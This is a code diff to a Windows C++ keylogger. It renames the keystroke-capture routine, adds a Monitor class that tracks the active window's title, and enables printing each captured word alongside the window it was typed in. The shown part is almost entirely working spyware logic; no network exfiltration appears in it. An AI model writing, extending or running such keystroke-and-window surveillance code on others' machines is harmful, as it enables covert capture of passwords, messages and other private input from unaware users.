@@ -63,13 +63,13 @@ class KeyLogger {
         std::string word;
         while (true) {
             Sleep(10);
-            word = KeyLogger::Work(word, charCallback, wordCallback);
+            word = KeyLogger::onNewWord(word, charCallback, wordCallback);
         }
     }
     /*
     * Start the KeyLogger loop.
     */
-    public: static std::string Work(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
+    public: static std::string onNewWord(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
     {
         char character = KeyLogger::CatchChar();
         if (character == NULL) return word;
@@ -197,10 +197,26 @@ std::string GetActiveWindowTitle()
     int pid = GetWindowProcessID(hwnd);
     Process p = Process.GetProcessById(pid);*/
     //string appName = p.ProcessName;
-    return path + " | " + name;
+    return name;
 }
-
-
+/// <summary>
+/// 
+/// </summary>
+class Monitor {
+public: static std::string onWindowChange(std::string activeWindow, const std::function<void(std::string)>& callback)
+    {
+        std::string newActiveWindow = GetActiveWindowTitle();
+        if (newActiveWindow != activeWindow) {
+            activeWindow = newActiveWindow;
+            callback(activeWindow);
+        }
+        return activeWindow;
+    }
+};
+/// <summary>
+/// 
+/// </summary>
+/// <returns></returns>
 int main()
 {
     bool monitor = true;
@@ -211,15 +227,15 @@ int main()
     // infinite loop each 50 ms
     Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
         // word assignation
-        word = KeyLogger::Work(word, [](char c) {}, [](std::string w) {
+        word = KeyLogger::onNewWord(word, [](char c) {}, [](std::string w) {
             // new word appear!!
-            //std::cout << w << std::endl;
+            std::cout << w << std::endl;
         });
-        std::string newActiveWindow = GetActiveWindowTitle();
-        if (newActiveWindow != activeWindow) {
-            activeWindow = newActiveWindow;
-            std::cout << activeWindow << std::endl;
-        }
+        // active window assignation
+        activeWindow = Monitor::onWindowChange(activeWindow, [](std::string w) {
+            // active window has been changed!!
+            std::cout << w << std::endl;
+        });
     });
     // for (const auto& value: words) std::cout << value + char(VK_SPACE);
     return 0;
